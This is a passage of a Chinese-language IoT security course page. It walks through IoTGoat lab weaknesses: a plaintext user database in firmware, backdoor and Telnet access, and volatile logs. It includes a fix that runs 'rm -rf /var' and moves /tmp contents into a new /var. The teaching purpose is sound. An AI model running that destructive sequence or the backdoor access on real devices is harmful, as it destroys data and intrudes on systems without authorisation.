+
+
+<h2 class="relative group">🦉I6 隱私保護不足 
+    <div id="i6-%E9%9A%B1%E7%A7%81%E4%BF%9D%E8%AD%B7%E4%B8%8D%E8%B6%B3" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i6-%E9%9A%B1%E7%A7%81%E4%BF%9D%E8%AD%B7%E4%B8%8D%E8%B6%B3" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>隱私保護不足 (Insufficient Privacy Protection) 表示 IoT 設備未充分保護隱私資訊。導致敏感資訊洩露給未經授權的人。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>蒐集超出需求的資訊</li>
+<li>未將使用者資訊加密儲存或傳輸</li>
+<li>未遵守隱私法規，例如：GDPR、CCPA 等</li>
+</ul>
+<p>我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 <code>Firmwalker</code> 掃描的結果中可以發現從韌體中提取出來的資料存在結尾為 <code>.db</code> 的檔案 <code>sensordata.db</code>，有極高機率是資料庫的儲存檔案。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I6-1_hu2031412405115862108.png 330w,
+        /materials/iot_security/exercise/I6-1_hu15350830769708068068.png 660w,
+        /materials/iot_security/exercise/I6-1_hu12122428511835230445.png 1024w,
+        /materials/iot_security/exercise/I6-1_hu12565497449442817516.png 2x"
+        src="/materials/iot_security/exercise/I6-1_hu15350830769708068068.png"
+        alt="I6-1"
+      />
+      
+    </figure>
+</p>
+<p>我們可以使用 <code>cat</code> 指令開啟檔案並觀察，可以發現檔案中出現了 sqlite 的字串，因此可以假設 <code>sensordata.db</code> 為 SQLite 的資料儲存檔案。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I6-2_hu5063976695224139763.png 330w,
+        /materials/iot_security/exercise/I6-2_hu7216999803894640568.png 660w,
+        /materials/iot_security/exercise/I6-2_hu7021251760954504685.png 1024w,
+        /materials/iot_security/exercise/I6-2_hu17363010135997851415.png 2x"
+        src="/materials/iot_security/exercise/I6-2_hu7216999803894640568.png"
+        alt="I6-2"
+      />
+      
+    </figure>
+</p>
+<p>在 AttackBox 中，可以使用 <code>sqlitebrowser</code> 來開啟 SQLite 的 <code>.db</code> 檔案。在終端機輸入 <code>sqlitebrowser</code> 開啟程式，點選左上角的 Open Database 並選擇剛剛發現的檔案。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I6-3_hu12247320099277732223.png 330w,
+        /materials/iot_security/exercise/I6-3_hu8257014053862978648.png 660w,
+        /materials/iot_security/exercise/I6-3_hu5423295345736896066.png 1024w,
+        /materials/iot_security/exercise/I6-3_hu15718241609455564309.png 2x"
+        src="/materials/iot_security/exercise/I6-3_hu8257014053862978648.png"
+        alt="I6-3"
+      />
+      
+    </figure>
+</p>
+<p>開啟後可以看到兩個 Table，對第一個 Table 的 sensors 點選右鍵並選擇 Browse Table。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I6-4_hu5992893486785437251.png 330w,
+        /materials/iot_security/exercise/I6-4_hu7014047110092730026.png 660w,
+        /materials/iot_security/exercise/I6-4_hu12365570713212296796.png 1024w,
+        /materials/iot_security/exercise/I6-4_hu508218856352408465.png 2x"
+        src="/materials/iot_security/exercise/I6-4_hu7014047110092730026.png"
+        alt="I6-4"
+      />
+      
+    </figure>
+</p>
+<p>接著便可瀏覽此 Table 中的使用者資料，可以發現 IoTGoat 未將敏感的個人資料進行加密儲存進行保護，當資料被駭客取得後就能直接利用。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I6-5_hu4807140670429688378.png 330w,
+        /materials/iot_security/exercise/I6-5_hu1254629636625364097.png 660w,
+        /materials/iot_security/exercise/I6-5_hu7179706658587157627.png 1024w,
+        /materials/iot_security/exercise/I6-5_hu7965802636841628547.png 2x"
+        src="/materials/iot_security/exercise/I6-5_hu1254629636625364097.png"
+        alt="I6-5"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">🦉I7 不安全的資料傳輸和存儲 
+    <div id="i7-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%82%B3%E8%BC%B8%E5%92%8C%E5%AD%98%E5%84%B2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i7-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E8%B3%87%E6%96%99%E5%82%B3%E8%BC%B8%E5%92%8C%E5%AD%98%E5%84%B2" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>不安全的資料傳輸和儲存 (Insecure Data Transfer and Storage) 表示 IoT 設備在傳輸或儲存資料時可能存在的安全性弱點。當這些裝置未對資料進行適當的加密或保護時，可能會導致敏感資訊被竊取或洩露。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>在網路傳輸中未使用加密</li>
+<li>敏感資料未進行適當加密或保護</li>
+<li>系統未適當處理與資料相關的錯誤</li>
+</ul>
+<p>IoT 裝置的製造商在裝置的設計和開發過程中應該重視資料安全。並考慮資料的加密和保護需求，在測試和實際運作的過程中確保資料安全能夠得到滿足。觀察上一章的 <code>sensordata.db</code>，IoTGoat 未將敏感的個人資料進行加密儲存進行保護，當資料被駭客取得後就能直接利用。</p>
+
+
+<h2 class="relative group">🦉I8 缺乏設備管理 
+    <div id="i8-%E7%BC%BA%E4%B9%8F%E8%A8%AD%E5%82%99%E7%AE%A1%E7%90%86" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i8-%E7%BC%BA%E4%B9%8F%E8%A8%AD%E5%82%99%E7%AE%A1%E7%90%86" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>缺乏設備管理 (Lack of Device Management) 表示 IoT 設備在管理和維護方面無法進行有效的更新管理、設定管理等，並可能導致裝置的安全性降低，增加受到攻擊的風險。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>缺乏有效的 IoT 設備版本管理</li>
+<li>缺乏 IoT 設備身份驗證機制</li>
+<li>無法管理 IoT 設備的遠端訪問</li>
+</ul>
+<p>我們同樣可以透過 IoTGoat 的實作來觀察該弱點。使用 IoTGoat 的後門進入系統內，可以發現 IoTGoat 根目錄下的 <code>/var</code> 直接被連結到 <code>/tmp</code>，導致在系統每次重新啟動，所有 log 都會被系統刪除。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I8-1_hu13293500014172490850.png 330w,
+        /materials/iot_security/exercise/I8-1_hu10543266707538308202.png 660w,
+        /materials/iot_security/exercise/I8-1_hu7263278282683591305.png 1024w,
+        /materials/iot_security/exercise/I8-1_hu15628244669915814413.png 2x"
+        src="/materials/iot_security/exercise/I8-1_hu10543266707538308202.png"
+        alt="I8-1"
+      />
+      
+    </figure>
+</p>
+<p>要解決此問題，我們需要先將原始的 <code>/var</code> 刪除並新增一個 <code>/var</code>，再將原本在 <code>/tmp</code> 下的檔案移動至新的 <code>/var</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm -rf /var
+</span></span><span class="line"><span class="cl">mkdir /var
+</span></span><span class="line"><span class="cl">mv /tmp/* /var
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I8-2_hu2458065275251843598.png 330w,
+        /materials/iot_security/exercise/I8-2_hu7291326575194404484.png 660w,
+        /materials/iot_security/exercise/I8-2_hu2088219263998398973.png 1024w,
+        /materials/iot_security/exercise/I8-2_hu15558709249980914917.png 2x"
+        src="/materials/iot_security/exercise/I8-2_hu7291326575194404484.png"
+        alt="I8-2"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">🦉I9 不安全的初始設置 
+    <div id="i9-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%88%9D%E5%A7%8B%E8%A8%AD%E7%BD%AE" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i9-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%88%9D%E5%A7%8B%E8%A8%AD%E7%BD%AE" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>不安全的初始設置 (Insecure Default Settings) 表示 IoT 設備的出廠預設設定不安全。導致裝置在出廠時就存在重大的安全風險被攻擊者利用。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>出廠預設設定包含弱密碼</li>
+<li>預設允許未經授權的訪問或修改</li>
+<li>預設開啟不必要的網路服務</li>
+</ul>
+<p>我們同樣可以透過 IoTGoat 的實作來觀察該弱點。回顧在 <code>不安全的網路服務</code> 章節中的實作以及 nmap 掃描結果。在 IoT 設備擁有 SSH 連接方式的情況下在 65534 埠發現了 Telnet。而 5515 埠的 Backdoor 也是由於出廠時開發人員忘記關掉的 Debug 模式，造成不安全的初始設置的弱點。</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /materials/iot_security/exercise/I9-1_hu4677684705650073390.png 330w,
+        /materials/iot_security/exercise/I9-1_hu3897265636194023020.png 660w,
+        /materials/iot_security/exercise/I9-1_hu2594489353662714923.png 1024w,
+        /materials/iot_security/exercise/I9-1_hu11538395217041320040.png 2x"
+        src="/materials/iot_security/exercise/I9-1_hu3897265636194023020.png"
+        alt="I9-1"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">🦉I10 缺乏物理防禦 
+    <div id="i10-%E7%BC%BA%E4%B9%8F%E7%89%A9%E7%90%86%E9%98%B2%E7%A6%A6" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i10-%E7%BC%BA%E4%B9%8F%E7%89%A9%E7%90%86%E9%98%B2%E7%A6%A6" aria-label="定位點">#</a>
+    </span>        
+    
+</h2>
+<p>缺乏物理防禦 (Lack of Physical Hardening) 表示 IoT 設備在物理安全方面的弱點。包含物理存取、設備竊取、設備破壞等。</p>
+<p>發生該弱點的 IoT 設備通常具有以下幾點特徵：</p>
+<ul>
+<li>IoT 設備容易被拆解或破壞，讓攻擊者能夠存取內部</li>
+</ul>
+<p>物理安全是一種重要的安全考慮因素，裝置製造商需要確保設備具有足夠的物理強化措施，並設計出防止未經授權拆解或修改的 IoT 設備以降低 IoT 設備遭受物理攻擊的風險。</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+          
+            
+            
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="Tonya" src="/img/author_hu9798571303467919006.jpg" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      作者
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Tonya
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">就是個喜歡看 Vtuber 的平凡資安人</div>
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+          
+
+          
+            
+                
+                  
+                
+              
+              
+<div class="flex author author-extra mt-4">
+  
+      
+      
+        
+          
+        
+        <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+          src="/img/redmeow_hu10806888911134775893.jpg" />
+      
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      作者
+    </div>
+    <a  href="http://localhost:1313/authors/redmeow/"  class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      Red Meow
+    </a>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">Red Meow</div>
+    
+    <div class="text-2xl sm:text-lg">
+      <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+          
+          <div class="mb-10"></div>
+          
+
+        
+
+        
+<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5">
+    
+    <summary
+        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+        IoT 設備檢測實務：攻擊實戰與防禦指南 - 本文屬於一個選集。
+    </summary>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/materials/iot_security/introduction/">
+            § 1: 1. IoT 設備安全簡介
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/materials/iot_security/basic_knowledge/">
+            § 2: 2. IoT 設備安全基礎知識
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="http://localhost:1313/materials/iot_security/web_application_security_vulnerabilities/">
+            § 3: 3. IoT 網路應用系統安全弱點
+        </a>
+    </div>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        § 4: 本文
+    </div>
+    
+    
+
+
+</details>
+
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_materials\\IoT_Security\\Exercise\\index.md"
+        var oid_likes = "likes_materials\\IoT_Security\\Exercise\\index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/materials/iot_security/web_application_security_vulnerabilities/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >3. IoT 網路應用系統安全弱點</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-09-08T00:00:00&#43;00:00">8 September 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="捲動到頁頂" title="捲動到頁頂">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      Tonya
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      以 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a> 製作
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="搜尋"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="關閉 (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
